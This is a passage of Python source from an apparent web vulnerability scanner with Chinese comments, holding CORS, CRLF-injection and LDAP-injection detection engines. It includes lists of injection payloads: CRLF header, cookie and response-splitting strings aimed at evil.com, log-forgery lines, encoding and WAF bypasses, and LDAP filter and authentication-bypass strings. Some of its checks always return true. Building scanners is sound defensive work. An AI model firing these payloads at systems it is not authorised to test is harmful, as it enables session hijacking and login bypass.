        "Access-Control-Max-Age",
        "Access-Control-Request-Method",
        "Access-Control-Request-Headers",
    ]

    UNSAFE_INDICATORS = [
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Origin: null",
        "Access-Control-Allow-Methods: *",
        "Access-Control-Allow-Headers: *",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if await self._is_cors_target(url, session):
            return {
                'url': url,
                'type': 'CORS 端点发现',
                'ai_verdict': '信息',
                'evidence': f'发现 CORS 端点: {url}',
                'diff_ratio': 0.0,
                'is_cors_endpoint': True
            }
        return None

    async def _is_cors_target(self, url: str, session) -> bool:
        getattr(settings, 'timeout', 30)
        try:
            resp = await async_get(url, session=session, timeout=5)
            if isinstance(resp, tuple):
                headers = resp[2] if len(resp) > 2 else {}
            else:
                headers = resp.headers

            for header in self.CORS_HEADERS:
                if header in headers:
                    return True
        except BaseException:
            logger.debug("suppressed exception (engine audit)")
        return False

    async def test_cors_config(
        self,
        url: str,
        session
    ) -> Dict:
        result = {
            "has_cors": False,
            "aca_origin": "",
            "acac": "",
            "allowed_methods": [],
            "allowed_headers": [],
            "exposed_headers": [],
            "max_age": "",
            "is_unsafe": False,
            "vulnerabilities": []
        }
        timeout = getattr(settings, 'timeout', 30)

        try:
            resp = await async_get(url, session=session, timeout=timeout)
            if isinstance(resp, tuple):
                headers = resp[2] if len(resp) > 2 else {}
            else:
                headers = resp.headers

            result["aca_origin"] = headers.get("Access-Control-Allow-Origin", "")
            result["acac"] = headers.get("Access-Control-Allow-Credentials", "")
            result["allowed_methods"] = self._parse_header_list(headers.get("Access-Control-Allow-Methods", ""))
            result["allowed_headers"] = self._parse_header_list(headers.get("Access-Control-Allow-Headers", ""))
            result["exposed_headers"] = self._parse_header_list(headers.get("Access-Control-Expose-Headers", ""))
            result["max_age"] = headers.get("Access-Control-Max-Age", "")

            if result["aca_origin"] or result["acac"]:
                result["has_cors"] = True

            if result["aca_origin"] == "*":
                result["is_unsafe"] = True
                result["vulnerabilities"].append({
                    "type": "CORS 通配符配置",
                    "severity": "Medium",
                    "detail": "Access-Control-Allow-Origin: * 允许任意域名跨域访问",
                    "fix": "使用具体的域名白名单"
                })

            if result["acac"].lower() == "true" and result["aca_origin"] == "*":
                result["vulnerabilities"].append({
                    "type": "CORS 通配符 + 凭证允许",
                    "severity": "Critical",
                    "detail": "Access-Control-Allow-Origin: * 且 Access-Control-Allow-Credentials: true，允许凭证跨域",
                    "fix": "禁止同时使用通配符和凭证"
                })

        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return result

    async def test_origin_reflection(
        self,
        url: str,
        session,
        test_origins: List[str] = None
    ) -> List[Dict]:
        if test_origins is None:
            test_origins = self.ATTACKER_ORIGINS[:5]

        findings = []
        timeout = getattr(settings, 'timeout', 30)

        for origin in test_origins:
            try:
                headers = {"Origin": origin}
                resp = await async_get(url, session=session, headers=headers, timeout=timeout)

                if isinstance(resp, tuple):
                    status = resp[0]
                    resp_headers = resp[2] if len(resp) > 2 else {}
                else:
                    status = resp.status
                    resp_headers = resp.headers

                acao = resp_headers.get("Access-Control-Allow-Origin", "")
                acac = resp_headers.get("Access-Control-Allow-Credentials", "")

                if acao == origin:
                    severity = "Critical" if acac.lower() == "true" else "High"
                    findings.append({
                        'url': url,
                        'type': 'CORS Origin 反射',
                        'severity': severity,
                        'origin': origin,
                        'evidence': f'Access-Control-Allow-Origin 反射了攻击者域名 {origin}',
                        'acac': acac,
                        'status': status,
                        'recommendation': '使用域名白名单，禁止反射任意 Origin'
                    })

                if origin in acao and acao != origin:
                    findings.append({
                        'url': url,
                        'type': 'CORS Origin 部分反射',
                        'severity': 'Medium',
                        'origin': origin,
                        'evidence': f'Access-Control-Allow-Origin 包含攻击者域名特征: {acao}',
                        'acac': acac,
                        'status': status,
                        'recommendation': '严格校验 Origin 白名单'
                    })

                if acao == "null":
                    findings.append({
                        'url': url,
                        'type': 'CORS null Origin 允许',
                        'severity': 'Medium',
                        'evidence': 'Access-Control-Allow-Origin: null 允许 null Origin 访问',
                        'recommendation': '禁止 null Origin 访问'
                    })

            except Exception as e:
                self.log_debug(f"Origin 反射测试失败 {origin}: {e}")

        return findings

    async def test_preflight(
        self,
        url: str,
        session
    ) -> Dict:
        result = {
            "supports_preflight": False,
            "allowed_methods": [],
            "allowed_headers": [],
            "max_age": "",
        }
        timeout = getattr(settings, 'timeout', 30)

        try:
            headers = {
                "Origin": "https://test.example.com",
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "Content-Type, Authorization"
            }

            resp = await async_options(url, session=session, headers=headers, timeout=timeout)

            if isinstance(resp, tuple):
                status = resp[0]
                resp_headers = resp[2] if len(resp) > 2 else {}
            else:
                status = resp.status
                resp_headers = resp.headers

            if status == 200 or status == 204:
                result["supports_preflight"] = True
                result["allowed_methods"] = self._parse_header_list(resp_headers.get("Access-Control-Allow-Methods", ""))
                result["allowed_headers"] = self._parse_header_list(resp_headers.get("Access-Control-Allow-Headers", ""))
                result["max_age"] = resp_headers.get("Access-Control-Max-Age", "")

                if "*" in result["allowed_methods"]:
                    result["allow_all_methods"] = True

                if "*" in result["allowed_headers"]:
                    result["allow_all_headers"] = True

        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return result

    def _parse_header_list(self, header_value: str) -> List[str]:
        if not header_value:
            return []
        return [h.strip() for h in header_value.split(",") if h.strip()]

    async def scan(
        self,
        target: str,
        session,
        **kwargs
    ) -> List[Dict]:
        # 升级：全局引擎现接收 recon 发现的 endpoints（含 /cors 等路径级端点），
        # 逐端点检测 CORS 配置错误，而非仅检测根 target（此前漏报路径级 CORS）。
        endpoints = kwargs.get("endpoints") or [target]
        findings: List[Dict] = []
        seen = set()
        for ep in endpoints:
            if not ep or ep.lower().startswith(("javascript:", "data:", "file:")):
                continue
            logger.info(f"🔐 开始 CORS 配置检测: {ep}")

            config = await self.test_cors_config(ep, session)

            if config.get("vulnerabilities"):
                for vuln in config["vulnerabilities"]:
                    key = (ep, vuln["type"])
                    if key in seen:
                        continue
                    seen.add(key)
                    findings.append({
                        'url': ep,
                        'type': vuln["type"],
                        'severity': vuln["severity"],
                        'evidence': vuln["detail"],
                        'recommendation': vuln["fix"],
                        'aca_origin': config["aca_origin"],
                        'acac': config["acac"],
                    })

            reflection_results = await self.test_origin_reflection(ep, session)
            findings.extend(reflection_results)

            preflight = await self.test_preflight(ep, session)

            if preflight.get("supports_preflight"):
                if preflight.get("allow_all_methods"):
                    findings.append({
                        'url': ep,
                        'type': 'CORS 允许所有方法',
                        'severity': 'Medium',
                        'evidence': 'Access-Control-Allow-Methods: * 允许任意 HTTP 方法',
                        'recommendation': '只允许必要的 HTTP 方法'
                    })

                if preflight.get("allow_all_headers"):
                    findings.append({
                        'url': ep,
                        'type': 'CORS 允许所有头',
                        'severity': 'Low',
                        'evidence': 'Access-Control-Allow-Headers: * 允许任意请求头',
                        'recommendation': '只允许必要的请求头'
                    })

                if preflight.get("max_age"):
                    try:
                        max_age = int(preflight["max_age"])
                        if max_age > 86400:
                            findings.append({
                                'url': ep,
                                'type': 'CORS Max-Age 过长',
                                'severity': 'Low',
                                'evidence': f'Access-Control-Max-Age: {max_age} 秒（超过24小时）',
                                'recommendation': '设置合理的 Max-Age（如 3600 秒）'
                            })
                    except BaseException:
                        logger.debug("suppressed exception (engine audit)")

        logger.info(f"✅ CORS 扫描完成，发现 {len(findings)} 个问题")
        return findings


# ============================================================

# 从 crlf.py 合并


# ============================================================

# engines/crlf.py
"""
CRLF（回车换行）注入检测引擎 - 重构版

功能：
1. HTTP 头注入检测（注入自定义响应头）
2. 响应拆分攻击检测（分割 HTTP 响应）
3. Set-Cookie 注入检测（注入恶意 Cookie）
4. Location 头注入检测（重定向劫持）
5. 日志伪造检测（注入虚假日志条目）
6. 浏览器缓存投毒检测
7. WAF 绕过

检测流程：
1. 识别可能注入 CRLF 的参数
2. 注入 CRLF 序列 + 恶意头
3. 检测响应中是否包含注入的头
4. 检测响应拆分
5. 生成漏洞报告
"""


class CRLFEngine(BaseEngine):
    """CRLF 注入检测引擎"""

    name = "crlf"
    description = "CRLF 注入检测引擎"

    # ===== 优先测试的参数名 =====
    priority_params = [
        "url", "redirect", "return", "next", "to", "goto",
        "header", "set-cookie", "cookie", "location",
        "ref", "referer", "referrer", "origin",
        "host", "domain", "site", "path",
        "log", "message", "error", "status",
        "username", "user", "name", "email",
    ]

    # ===== CRLF Payload =====
    payloads = [
        # ===== 基础 CRLF =====
        ("%0d%0a", "基础CRLF"),
        ("%0a", "LF换行"),
        ("%0d", "CR回车"),
        ("%0d%0a%0d%0a", "双CRLF"),

        # ===== 头注入 =====
        ("%0d%0aX-Test: injected", "注入自定义头"),
        ("%0d%0aSet-Cookie: test=injected", "注入Cookie"),
        ("%0d%0aLocation: http://evil.com", "注入Location"),
        ("%0d%0aContent-Type: text/html", "注入Content-Type"),
        ("%0d%0aX-Forwarded-For: 127.0.0.1", "注入XFF"),
        ("%0d%0aX-Real-IP: 127.0.0.1", "注入Real-IP"),
        ("%0d%0aX-Originating-IP: 127.0.0.1", "注入Originating-IP"),
        ("%0d%0aX-Host: evil.com", "注入X-Host"),
        ("%0d%0aX-Original-URL: /admin", "注入X-Original-URL"),
        ("%0d%0aX-Rewrite-URL: /admin", "注入X-Rewrite-URL"),
        ("%0d%0aX-Forwarded-Host: evil.com", "注入X-Forwarded-Host"),
        ("%0d%0aX-Forwarded-Scheme: http", "注入X-Forwarded-Scheme"),
        ("%0d%0aX-Forwarded-Proto: http", "注入X-Forwarded-Proto"),

        # ===== 响应拆分 =====
        ("%0d%0aContent-Length: 0%0d%0a%0d%0a", "响应拆分-空响应"),
        ("%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html><body>Hacked</body></html>", "响应拆分-注入响应"),
        ("%0d%0aContent-Length: 0%0d%0a%0d%0aLocation: http://evil.com", "响应拆分-Location"),
        ("%0d%0aContent-Length: 0%0d%0a%0d%0aSet-Cookie: session=evil", "响应拆分-Cookie"),

        # ===== 缓存投毒 =====
        ("%0d%0aCache-Control: private%0d%0a", "缓存投毒"),
        ("%0d%0aCache-Control: no-cache%0d%0a", "缓存投毒2"),
        ("%0d%0aExpires: -1%0d%0a", "缓存投毒3"),
        ("%0d%0aPragma: no-cache%0d%0a", "缓存投毒4"),

        # ===== 日志伪造 =====
        ("%0d%0a[ERROR] System compromised", "日志伪造"),
        ("%0d%0a[WARNING] Unauthorized access", "日志伪造2"),
        ("%0d%0a[SECURITY] Alert: exploit detected", "日志伪造3"),
        ("%0d%0a[INFO] Admin logged in", "日志伪造4"),
        ("%0d%0a[FATAL] Critical error", "日志伪造5"),

        # ===== Cookie 注入 =====
        ("%0d%0aSet-Cookie: admin=true%0d%0a", "Cookie注入-admin"),
        ("%0d%0aSet-Cookie: user=admin%0d%0a", "Cookie注入-user"),
        ("%0d%0aSet-Cookie: role=admin%0d%0a", "Cookie注入-role"),
        ("%0d%0aSet-Cookie: session=evil%0d%0a", "Cookie注入-session"),
        ("%0d%0aSet-Cookie: token=evil%0d%0a", "Cookie注入-token"),

        # ===== XSS 组合 =====
        ("%0d%0a<script>alert(1)</script>", "XSS组合"),
        ("%0d%0a<img src=x onerror=alert(1)>", "XSS组合2"),
        ("%0d%0a<svg onload=alert(1)>", "XSS组合3"),

        # ===== 编码绕过 =====
        ("%250d%250a", "双重编码"),
        ("%25250d%25250a", "三重编码"),
        ("%0D%0A", "大写CRLF"),
        ("%0a%0d", "反转CRLF"),
        ("%0d%0a", "标准CRLF"),
        ("%0a", "单独LF"),

        # ===== 多个头注入 =====
        ("%0d%0aX-Test: injected%0d%0aX-Test2: injected2", "多个头注入"),
        ("%0d%0aSet-Cookie: a=1%0d%0aSet-Cookie: b=2", "多个Cookie注入"),
        ("%0d%0aX-Header: value%0d%0a", "带值的头注入"),
    ]

    # ===== CRLF 响应特征 =====
    CRLF_INDICATORS = [
        # 注入的测试头
        "X-Test: injected",
        "X-Header: value",
        "X-Test2: injected2",
        "Set-Cookie: test=injected",
        "Set-Cookie: a=1",
        "Set-Cookie: b=2",
        "Location: http://evil.com",
        "Content-Type: text/html",
        "X-Forwarded-For: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "X-Host: evil.com",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Forwarded-Host: evil.com",

        # 响应拆分特征
        "HTTP/1.1 200 OK",
        "HTTP/1.0 200 OK",
        "Content-Length: 0",

        # Cookie 注入
        "admin=true",
        "user=admin",
        "role=admin",
        "session=evil",
        "token=evil",

        # 日志伪造
        "[ERROR] System compromised",
        "[WARNING] Unauthorized access",
        "[SECURITY] Alert: exploit detected",
        "[INFO] Admin logged in",
        "[FATAL] Critical error",

        # XSS
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """
        检测 CRLF 注入漏洞

        检测流程：
        1. 快速探测：识别可能注入 CRLF 的参数
        2. 逐个测试 Payload
        3. 检测响应中是否包含注入的头
        4. 检测响应拆分
        5. WAF 检测与绕过
        """
        if isinstance(normal_resp, tuple):
            _normal_status, _normal_text = normal_resp[0], normal_resp[1]
            normal_resp[2] if len(normal_resp) > 2 else {}
        else:
            await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)

        # ===== 1. 快速探测 =====
        if not await self._is_crlf_target(url, param, session):
            self.log_debug(f"参数 {param} 不像是 CRLF 注入目标，跳过检测")
            return None

        # ===== 2. 获取 Payload =====
        payloads = self.reorder_payloads_by_param(param)

        # 如果是静态资源，减少 Payload
        if is_static:
            payloads = payloads[:10]

        # ===== 3. 主检测循环 =====
        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout)

                if isinstance(resp, tuple):
                    status = resp[0]
                    headers = resp[2] if len(resp) > 2 else {}
                    text = resp[1]
                else:
                    status = resp.status
                    headers = resp.headers
                    text = await resp.text()

                # ===== 检测 WAF =====
                waf_type = await self.detect_waf(text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                # ===== 检测 CRLF 注入 =====
                if self._has_crlf_injection(headers, text, payload):
                    evidence = self._extract_crlf_evidence(headers, text)
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'CRLF注入({desc})',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'evidence': evidence,
                        'injected_headers': self._find_injected_headers(headers),
                        'recommendation': '对用户输入进行严格过滤和编码'
                    }

                # ===== 检测响应拆分 =====
                if self._has_response_splitting(text):
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'CRLF注入-响应拆分({desc})',
                        'severity': 'Critical',
                        'ai_verdict': '高',
                        'evidence': f'检测到响应拆分特征: {text[:200]}',
                        'recommendation': '禁止用户输入中的 CRLF 字符'
                    }

                # ===== 检测日志伪造 =====
                if self._has_log_forgery(text):
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'CRLF注入-日志伪造({desc})',
                        'severity': 'Medium',
                        'ai_verdict': '高',
                        'evidence': f'检测到日志伪造特征: {text[:200]}',
                        'recommendation': '对日志输入进行过滤'
                    }

                # ===== 检测响应差异 =====
                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (status, text, headers),
                    threshold=0.1
                )
                if has_diff:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'CRLF注入-疑似({desc})',
                        'severity': 'Low',
                        'ai_verdict': '中',
                        'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                        'diff_ratio': diff_ratio
                    }

            except Exception as e:
                self.log_debug(f"CRLF 检测异常 {param}: {e}")

        return None

    # ============================================================
    # 辅助方法
    # ============================================================

    async def _is_crlf_target(self, url: str, param: str, session) -> bool:
        """判断是否可能为 CRLF 注入目标"""
        # 检查参数名
        crlf_params = ['url', 'redirect', 'return', 'next', 'to', 'goto', 'header', 'location']
        if any(p in param.lower() for p in crlf_params):
            return True

        # 检查 URL 是否包含重定向相关关键词
        url_lower = url.lower()
        if any(p in url_lower for p in ['redirect', 'return', 'next', 'to', 'goto']):
            return True

        return True

    def _has_crlf_injection(self, headers: Dict, text: str, payload: str) -> bool:
        """检测是否有 CRLF 注入"""
        # 检查响应头
        for indicator in self.CRLF_INDICATORS:
            # 检查头
            for key, value in headers.items():
                if indicator in key or indicator in value:
                    return True

            # 检查响应体
            if indicator in text:
                return True

        # 检查 payload 中的 CRLF 序列是否在响应中
        crlf_sequences = ['\r', '\n', '\r\n']
        for seq in crlf_sequences:
            if seq in payload and seq in text:
                return True

        return False

    def _extract_crlf_evidence(self, headers: Dict, text: str) -> str:
        """提取 CRLF 注入证据"""
        # 检查头中的注入
        for key, value in headers.items():
            for indicator in self.CRLF_INDICATORS:
                if indicator in key or indicator in value:
                    return f'响应头包含注入内容: {key}: {value[:100]}'

        # 检查响应体
        for indicator in self.CRLF_INDICATORS:
            if indicator in text:
                idx = text.find(indicator)
                start = max(0, idx - 30)
                end = min(len(text), idx + len(indicator) + 30)
                return f'响应体包含注入内容: {text[start:end]}'

        return text[:200]

    def _find_injected_headers(self, headers: Dict) -> List[str]:
        """查找被注入的响应头"""
        injected = []
        for key, value in headers.items():
            for indicator in self.CRLF_INDICATORS:
                if indicator in key or indicator in value:
                    injected.append(f'{key}: {value[:50]}')
                    break
        return injected[:5]

    def _has_response_splitting(self, text: str) -> bool:
        """检测响应拆分"""
        splitting_indicators = [
            'HTTP/1.1 200 OK',
            'HTTP/1.0 200 OK',
            'HTTP/1.1 302 Found',
            'HTTP/1.0 302 Found',
            'Content-Length: 0',
            'Content-Type: text/html',
            '<html><body>',
        ]

        # 检查是否包含多个 HTTP 响应
        http_matches = re.findall(r'HTTP/\d\.\d \d{3}', text)
        if len(http_matches) >= 2:
            return True

        # 检查是否包含完整的响应头
        for indicator in splitting_indicators:
            if indicator in text:
                return True

        return False

    def _has_log_forgery(self, text: str) -> bool:
        """检测日志伪造"""
        log_patterns = [
            r'\[ERROR\]',
            r'\[WARNING\]',
            r'\[SECURITY\]',
            r'\[INFO\]',
            r'\[FATAL\]',
            r'\[DEBUG\]',
            r'\[TRACE\]',
            r'\[ALERT\]',
            r'\[CRITICAL\]',
        ]

        for pattern in log_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True

        return False

    # ============================================================
    # 编码绕过检测
    # ============================================================

    async def test_encoding_bypass(
        self,
        url: str,
        param: str,
        payload: str,
        parsed_query: str,
        session
    ) -> Optional[Dict]:
        """
        测试编码绕过

        使用不同的编码方式测试 CRLF 注入
        """
        encodings = [
            ('%0d%0a', 'URL编码'),
            ('%250d%250a', '双重URL编码'),
            ('%25250d%25250a', '三重URL编码'),
            ('\r\n', '原始CRLF'),
            ('\r', '原始CR'),
            ('\n', '原始LF'),
            ('%0D%0A', '大写URL编码'),
            ('%0a%0d', '反转CRLF'),
        ]

        for encoded, desc in encodings:
            # 替换 payload 中的 CRLF 为编码版本
            test_payload = payload.replace('%0d%0a', encoded)

            attack_url = build_attack_url(url, param, test_payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout)

                if isinstance(resp, tuple):
                    headers = resp[2] if len(resp) > 2 else {}
                    text = resp[1]
                else:
                    headers = resp.headers
                    text = await resp.text()

                if self._has_crlf_injection(headers, text, test_payload):
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': test_payload,
                        'type': f'CRLF注入-编码绕过({desc})',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'evidence': f'使用 {desc} 成功注入',
                        'recommendation': '对输入进行深度解码后过滤'
                    }
            except BaseException:
                logger.debug("suppressed exception (engine audit)")

        return None


# ============================================================
# 从 ldap.py 合并


# ============================================================

# engines/ldap.py
"""
LDAP 注入检测引擎 - 重构版

功能：
1. LDAP 参数识别（user, username, login, cn, uid, mail 等）
2. LDAP 注入 Payload（*、|、&、通配符、逻辑运算）
3. 响应分析（错误信息、长度异常）
4. LDAP 端口探测（389, 636, 3268, 3269）
5. 匿名绑定检测
6. 搜索过滤器注入

检测流程：
1. 识别可能的 LDAP 参数
2. 注入 LDAP 搜索过滤器
3. 检测响应中的 LDAP 错误
4. 检测响应长度异常
5. 端口探测（辅助）
"""


class LDAPEngine(BaseEngine):
    """LDAP 注入检测引擎"""

    name = "ldap"
    description = "LDAP 注入检测引擎"

    # 优先测试的参数名
    priority_params = [
        "user", "username", "login", "cn", "uid",
        "mail", "domain", "ou", "dc", "sn",
        "givenname", "displayname", "memberof",
        "employeeid", "department", "title",
        "email", "phone", "mobile",
    ]

    # ===== LDAP 注入 Payload =====
    payloads = [
        # ===== 基础通配符 =====
        ("*", "通配符-全部匹配"),
        ("*)", "通配符-闭合"),
        ("*)(uid=*", "通配符-任意uid"),
        ("*)(|(uid=*))", "通配符-OR"),

        # ===== 逻辑运算 =====
        ("*)(|(cn=admin))", "OR注入-admin"),
        ("*)(|(uid=admin))", "OR注入-uid"),
        ("*)(|(mail=admin@evil.com))", "OR注入-mail"),
        ("*)(&(uid=*)(|(cn=admin)))", "AND+OR注入"),
        ("*)(uid=*)(", "未闭合注入"),
        ("*)(uid=*))", "双括号注入"),
        ("*)(|(uid=*", "不完整注入"),

        # ===== 盲注 =====
        ("admin*", "盲注-前缀"),
        ("*admin*", "盲注-包含"),
        ("*)(uid=a*)(|(uid=*", "盲注-字符遍历"),
        ("*)(uid=admin*)(|(uid=*", "盲注-前缀匹配"),

        # ===== 布尔盲注 =====
        ("*)(&(uid=admin)(cn=admin))", "布尔-AND"),
        ("*)(|(uid=admin)(uid=guest))", "布尔-OR"),
        ("*)(&(uid=admin)(!(cn=guest)))", "布尔-NOT"),

        # ===== 特殊字符绕过 =====
        ("admin\\", "反斜杠绕过"),
        ("admin\\*", "反斜杠+通配符"),
        ("admin\\00", "空字节绕过"),
        ("admin%00", "URL编码空字节"),
        ("admin%2a", "URL编码*"),
        ("admin%28%29", "URL编码括号"),

        # ===== 大小写绕过 =====
        ("*)(|(UID=admin))", "UID大写"),
        ("*)(|(Cn=admin))", "Cn大写"),
        ("*)(|(MAIL=admin))", "MAIL大写"),

        # ===== 多属性注入 =====
        ("*)(|(cn=admin)(uid=admin)(mail=admin@evil.com))", "多属性OR"),
        ("*)(&(cn=admin)(uid=admin))", "多属性AND"),
        ("*)(&(cn=admin)(!(uid=guest)))", "多属性NOT"),

        # ===== 高级绕过 =====
        ("*)(&(uid=*)(objectClass=*))", "objectClass通配"),
        ("*)(&(uid=*)(sn=*))", "sn通配"),
        ("*)(&(uid=*)(givenName=*))", "givenName通配"),
        ("*)(&(uid=*)(mail=*))", "mail通配"),

        # ===== 身份验证绕过 =====
        ("admin)(|(password=*", "密码绕过"),
        ("admin)(|(userPassword=*", "userPassword绕过"),
        ("admin)(|(userpassword=*", "小写password绕过"),
        ("*)(|(userPassword=*", "任意用户密码绕过"),
    ]

    # ===== LDAP 错误特征 =====
    LDAP_ERROR_INDICATORS = [
        "ldap", "LDAP", "Active Directory", "AD",
        "directory", "directory service", "LDAPException",
        "javax.naming", "com.sun.jndi", "UnboundID",
        "Novell", "eDirectory", "OpenLDAP",
        "error code", "result code", "LDAP_ERROR",
        "invalid DN", "invalid search filter",
        "bad search filter", "syntax error",
        "object not found", "entry not found",
        "referral", "continuation reference",
        "size limit exceeded", "time limit exceeded",
        "strong authentication required",
        "confidentiality required",
        "unavailable", "server down",
        "busy", "unwilling to perform",
        "other", "unknown",
    ]

    # ===== LDAP 端口 =====
    LDAP_PORTS = [389, 636, 3268, 3269]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """
        检测 LDAP 注入漏洞

        检测流程：
        1. 快速探测：识别 LDAP 参数
        2. 逐个测试 Payload
        3. 检测 LDAP 错误特征
        4. 检测响应长度异常
        5. 端口探测（辅助）
        """
        if isinstance(normal_resp, tuple):
            _normal_status, normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)

        # ===== 1. 快速探测 =====
        if not await self._is_ldap_param(url, param, session):
            self.log_debug(f"参数 {param} 不像是 LDAP 参数，跳过检测")
            return None

        # ===== 2. 获取 Payload =====
        payloads = self.reorder_payloads_by_param(param)

        # 如果是静态资源，减少 Payload
        if is_static:
            payloads = payloads[:10]

        # ===== 3. 主检测循环 =====
        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                resp = await async_get(attack_url, session=session, timeout=settings.timeout)

                if isinstance(resp, tuple):
                    status = resp[0]
                    text = resp[1]
                else:
                    status = resp.status
                    text = await resp.text()

                # ===== 检测 WAF =====
                waf_type = await self.detect_waf(text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                # ===== 检测 LDAP 错误 =====
                if self._has_ldap_error(text):
                    evidence = self._extract_ldap_error(text)
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'LDAP注入({desc})',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'evidence': evidence,
                        'recommendation': '对用户输入进行 LDAP 过滤，使用安全查询函数'
                    }

                # ===== 检测响应长度异常 =====
                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (status, text, {}),
                    threshold=0.2
                )
                if has_diff:
                    # 检查是否是 LDAP 特定的长度变化
                    if len(text) > 500 and len(text) > len(normal_text) * 1.5:
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'LDAP注入-疑似({desc})',
                            'severity': 'Medium',
                            'ai_verdict': '中',
                            'evidence': f"响应长度异常变化 {diff_ratio:.1%}，可能返回额外数据",
                            'diff_ratio': diff_ratio,
                            'recommendation': '手动验证是否存在 LDAP 注入'
                        }

            except Exception as e:
                self.log_debug(f"LDAP 检测异常 {param}: {e}")

        return None

    # ============================================================
    # 辅助方法
    # ============================================================

    async def _is_ldap_param(self, url: str, param: str, session) -> bool:
        """判断是否为 LDAP 参数"""
        param_lower = param.lower()
        for p in self.priority_params:
            if p in param_lower:
                return True

        # 检查 URL 是否包含 LDAP 相关关键词
        url_lower = url.lower()
        ldap_keywords = ['ldap', 'auth', 'login', 'search', 'user', 'admin']
        if any(kw in url_lower for kw in ldap_keywords):
            return True

        return False

    def _has_ldap_error(self, text: str) -> bool:
        """检测 LDAP 错误特征"""
        text_lower = text.lower()
        for indicator in self.LDAP_ERROR_INDICATORS:
            if indicator.lower() in text_lower:
                return True
        return False

    def _extract_ldap_error(self, text: str) -> str:
        """提取 LDAP 错误信息"""
        lines = text.split('\n')
        for line in lines:
            for indicator in self.LDAP_ERROR_INDICATORS:
                if indicator in line:
                    return line[:200]

        # 查找包含 error 或 exception 的行
        for line in lines:
            if 'error' in line.lower() or 'exception' in line.lower():
                return line[:200]

        return text[:200]

    # ============================================================
    # 端口探测
    # ============================================================

    async def probe_ldap_ports(
        self,
        host: str,
        ports: List[int] = None
    ) -> List[Dict]:
        """
        探测 LDAP 端口

        参数:
            host: 目标主机
            ports: 要探测的端口列表

        返回:
            开放的 LDAP 端口列表
        """
        if ports is None:
            ports = self.LDAP_PORTS

        results = []

        for port in ports:
            try:
                # 尝试连接
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port),
                    timeout=3
                )

                # 发送简单的 LDAP 请求
                try:
                    # LDAP 初始请求
                    # 简单的 LDAP 绑定请求
                    # 0x30 0x0c 0x02 0x01 0x01 0x60 0x07 0x02 0x01 0x03 0x04 0x00 0x80 0x00
                    bind_request = bytes.fromhex('300c020101600702010304008000')
                    writer.write(bind_request)
                    await writer.drain()

                    response = await asyncio.wait_for(reader.read(1024), timeout=3)

                    # 检查响应是否有效
                    if response and len(response) > 0:
                        is_open = True
                    else:
                        is_open = True
                except BaseException:
                    is_open = True

                writer.close()
                await writer.wait_closed()

                if is_open:
                    results.append({
                        'port': port,
                        'service': 'LDAP' if port == 389 else 'LDAPS' if port == 636 else 'LDAP-GC' if port == 3268 else 'LDAPS-GC' if port == 3269 else 'LDAP',
                        'accessible': True
                    })
                    logger.info(f"🔍 发现 LDAP 端口: {host}:{port}")

            except (asyncio.TimeoutError, ConnectionRefusedError, ConnectionResetError):
                logger.debug("suppressed exception (engine audit)")
            except Exception as e:
                self.log_debug(f"LDAP 端口探测失败 {port}: {e}")

        return results

    # ============================================================
    # 匿名绑定检测
    # ============================================================

    async def test_anonymous_bind(
        self,
        host: str,
        port: int = 389
    ) -> Optional[Dict]:
        """
        测试 LDAP 匿名绑定

        检测是否允许匿名访问
        """
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=5
            )

            # LDAP 匿名绑定请求
